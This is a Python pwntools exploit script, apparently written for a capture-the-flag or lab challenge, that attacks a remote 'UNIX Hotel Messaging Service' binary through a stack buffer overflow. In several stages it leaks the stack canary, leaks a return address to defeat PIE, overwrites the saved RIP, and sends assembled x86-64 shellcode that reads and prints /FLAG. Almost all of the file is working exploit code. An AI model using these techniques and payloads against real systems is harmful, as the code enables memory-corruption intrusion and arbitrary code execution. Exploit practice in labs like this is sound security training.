from pwn import *

# --- Pwntools Setup ---
context.clear(arch='amd64')
# context.log_level = 'debug' # Uncomment for more detailed pwntools logging

# --- Configuration ---
HOST = "up.zoolab.org"
PORT = 12343 # Port for bof2

# --- Offsets Provided by User from GDB for bof2 ---
# Stage 1: Canary Leak via buf1
OFFSET_BUF1_TO_CANARY_PADDING = 137 # 136 bytes ('A's to send)

# Stage 2: RIP Leak via buf2 (for PIE calculation)
# This padding fills buf2, buf3, canary slot, and RBP slot with non-nulls
OFFSET_BUF2_TO_RBP_SLOT_PADDING = 0x68 # 96 bytes ('B's to send)
# These are for calculating msg_address from the leaked RIP
OFFSET_LEAKED_POINT_FROM_BASE = 0x9cbc # Offset of (task's saved RIP in main) from binary base
OFFSET_MSG_FROM_BASE = 0xef220         # Offset of 'msg' buffer from binary base

# Stage 3: Overwrite RIP via buf3
PADDING_BUF3_TO_CANARY_SLOT = 0x28 # 32 bytes ('C's to send)
JUNK_RBP_IN_BUF3_PAYLOAD_LEN = 8   # 8 bytes ('D's for RBP slot)

# --- Assembly Code (Shellcode to read /FLAG) ---
assembly_code = """
    jmp short call_flag
do_shellcode:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, rax
    sub rsp, 0x40
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    syscall
    add rsp, 0x40
    mov rax, 60
    xor rdi, rdi
    syscall
call_flag:
    call do_shellcode
    .asciz "/FLAG"
"""

try:
    shellcode = asm(assembly_code)
    payload_shellcode_final = shellcode.ljust(100, b'\x90') # Your padded version
    log.info(f"Assembled shellcode ({len(payload_shellcode_final)} bytes): {payload_shellcode_final.hex()}")
except PwnlibException as e:
    log.failure(f"Pwntools assembly error: {e}")
    exit(1)

# --- Main Exploit Logic ---
def exploit():
    p = remote(HOST, PORT)

    p.recvuntil(b"===========================================\n")
    p.recvuntil(b"Welcome to the UNIX Hotel Messaging Service\n")
    p.recvuntil(b"===========================================\n")

    # --- STAGE 1: Leak Canary via buf1 ---
    log.info(f"Stage 1: Sending {OFFSET_BUF1_TO_CANARY_PADDING} 'A's to buf1 to leak canary...")
    padding_for_canary_leak = b'A' * OFFSET_BUF1_TO_CANARY_PADDING
    # Using sendafter for prompt, and send for exact payload bytes.
    # User requested sendline: if read expects newline for processing before printf, this might be needed.
    # However, for filling buffers precisely before a printf %s that reads stack, 'send' is often safer.
    # Let's use send() for the payload part for precision.
    p.sendafter(b"\nWhat's your name? ", padding_for_canary_leak)


    p.recvuntil(b"Welcome, ")
    p.recvuntil(padding_for_canary_leak) # Consume the echoed 'A's
    
    # The next 7 bytes are the non-null part of canary. Canary LSB is \x00.
    # Then server prints "\nWhat's the room number? "
    leaked_canary_7_bytes = p.recv(7) # Read exactly 7 bytes
    
    if len(leaked_canary_7_bytes) != 7:
        log.failure(f"Canary Leak: Expected 7 bytes, got {len(leaked_canary_7_bytes)}: {leaked_canary_7_bytes.hex()}")
        p.interactive()
        return
    # leaked_canary = u64(leaked_canary_7_bytes.rjust(8, b'\x00'))
    leaked_canary = u64(leaked_canary_7_bytes.rjust(8, b'\x00'), endian='little')
    log.success(f"Canary Leak: Leaked 7 bytes: {leaked_canary_7_bytes.hex()}. Full canary: {hex(leaked_canary)}")
    # p.recvuntil(b"\nWhat's the room number? ") # Consume rest of line to sync for next stage
    print(f"{p.recv(1024).hex()}") # rbp value.

    # --- STAGE 2: Leak Task Return Address (RIP) via buf2 (for PIE) ---
    log.info(f"Stage 2: Sending {OFFSET_BUF2_TO_RBP_SLOT_PADDING} 'B's to buf2 to leak RIP...")
    padding_for_rip_leak = b'B' * OFFSET_BUF2_TO_RBP_SLOT_PADDING
    # This payload smashes buf2, buf3, canary slot, and RBP slot with 'B's (non-null)
    p.sendafter(b"What's the room number? ", padding_for_rip_leak) # sendline as per user note earlier for 0x88

    p.recvuntil(b"The room number is: ")
    p.recvuntil(padding_for_rip_leak.rstrip(b'\n')) # Consume echoed 'B's (rstrip \n if sendline added one)
                                                 # Or if sendline was for payload, it may include \n in padding_for_rip_leak

    # After the 'B's, printf continues and should print the 8-byte saved RIP
    # Then server prints "\nWhat's the customer's name? "
    leaked_rip_bytes = p.recv(8) # Read exactly 8 bytes for RIP
    log.info(f"Leaked raw bytes: {leaked_rip_bytes.hex()}")    
    leaked_actual_ret_addr = u64(leaked_rip_bytes.ljust(8, b'\x00'))
    log.success(f"RIP Leak: Leaked task return address: {hex(leaked_actual_ret_addr)}")
    p.recvuntil(b"\nWhat's the customer's name? ") # Sync for next stage

    # Calculate runtime addresses
    runtime_binary_base = leaked_actual_ret_addr - OFFSET_LEAKED_POINT_FROM_BASE
    log.info(f"Calculated runtime_binary_base: {hex(runtime_binary_base)}")
    runtime_msg_address = runtime_binary_base + OFFSET_MSG_FROM_BASE
    log.success(f"Calculated runtime_msg_address (target for new RIP): {hex(runtime_msg_address)}")

    # --- STAGE 3: Overwrite RIP via buf3 (Restore Canary) ---
    log.info("Stage 3: Sending payload to buf3 to overwrite RIP...")
    payload_buf3_final_overwrite = b'C' * PADDING_BUF3_TO_CANARY_SLOT
    payload_buf3_final_overwrite += p64(leaked_canary)
    payload_buf3_final_overwrite += b'D' * JUNK_RBP_IN_BUF3_PAYLOAD_LEN
    payload_buf3_final_overwrite += p64(runtime_msg_address)
    

    # The prompt "\nWhat's the customer's name? " was consumed by previous recvuntil
    p.sendline(payload_buf3_final_overwrite)

    # --- STAGE 4: Send Shellcode to msg buffer ---
    p.recvuntil(b"The customer's name is: ") # Consume part of the echo from buf3
    p.recvuntil(b"\nLeave your message: ")    # Sync to the correct prompt
    log.info("Stage 4: Sending shellcode to msg buffer...")
    p.send(payload_shellcode_final) # Send raw shellcode is fine, read takes up to 512 bytes

    # --- STAGE 5: Receive the flag ---
    log.success("Payloads sent. Shellcode should execute. Waiting for flag...")
    try:
        flag_output = p.recvall(timeout=2.0) 
        log.info("Received from server:")
        if flag_output:
            decoded_output = flag_output.decode(errors='replace').strip()
            print(decoded_output)
            if not decoded_output or "Thank you!" in decoded_output and len(decoded_output.replace("Thank you!","").strip()) == 0 :
                log.warning("Flag not clearly present or only 'Thank you!' received.")
        else:
            log.warning("No output received for flag.")
    except PwnlibException as e:
        log.failure(f"Error receiving flag: {e}")
    finally:
        p.close()

if __name__ == "__main__":
    try:
        exploit()
    except Exception as e:
        log.critical(f"An unexpected Python error occurred: {e}")